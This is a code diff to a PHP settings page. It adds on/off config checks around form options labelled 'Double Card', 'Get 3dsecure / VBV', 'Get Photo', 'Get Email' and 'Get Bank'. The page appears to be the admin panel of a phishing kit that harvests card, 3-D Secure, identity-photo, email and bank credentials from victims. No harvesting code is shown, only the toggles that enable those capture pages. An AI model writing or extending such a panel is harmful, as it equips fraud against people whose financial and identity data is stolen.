@@ -32,6 +32,9 @@ if(isset($_GET['save']))
                            <option value="en">English</option>
                        </select>
                     </div>
+                    <?php
+                    if(ryu_config('CONFIG_ONOFF' , 'page_case') == true){
+                        ?>
                     <div class="flex flex-col">
                         <label for="case">Case</label>
                         <select name="case" id="case" class="select2" style="width: 100%">
@@ -41,6 +44,9 @@ if(isset($_GET['save']))
     
                         </select>
                     </div>
+                    <?php
+                    }
+                    ?>
                     <div class="flex flex-col">
                         <label for="blocked_page">Page Blocked display</label>
                         <select name="blocked_page" id="blocked_page" class="select2" style="width: 100%">
@@ -72,22 +78,40 @@ if(isset($_GET['save']))
                         <label for="sangger">Double Card</label>
                         <?php echo radio($config,'double_card'); ?>
                     </div>
+                    <?php
+                    if(ryu_config('CONFIG_ONOFF','page_vbv') == true){
+                        ?>
                     <div class="flex flex-col gap-y-1">
                         <label for="sangger">Get 3dsecure / VBV</label>
                         <?php echo radio($config,'3dsecure'); ?>
                     </div>
+                    <?php
+                    }
+                    if(ryu_config('CONFIG_ONOFF', 'page_photo') == true){
+                        ?>
                     <div class="flex flex-col gap-y-1">
                         <label for="sangger">Get Photo</label>
                         <?php echo radio($config,'pap'); ?>
                     </div>
+                    <?php
+                    }
+                    if(ryu_config('CONFIG_ONOFF' , 'page_email') == true){
+                        ?>
                     <div class="flex flex-col gap-y-1">
                         <label for="sangger">Get Email</label>
                         <?php echo radio($config,'email'); ?>
                     </div>
+                    <?php
+                    }
+                    if(ryu_config('CONFIG_ONOFF' , 'page_bank') == true){
+                        ?>
                     <div class="flex flex-col gap-y-1">
                         <label for="sangger">Get Bank</label>
                         <?php echo radio($config,'bank'); ?>
                     </div>
+                    <?php
+                    }
+                    ?>
                     <div class="flex flex-col gap-y-1">
                         <label for="sangger">Lock Language</label>
                         <?php echo radio($config,'lock_lang'); ?>
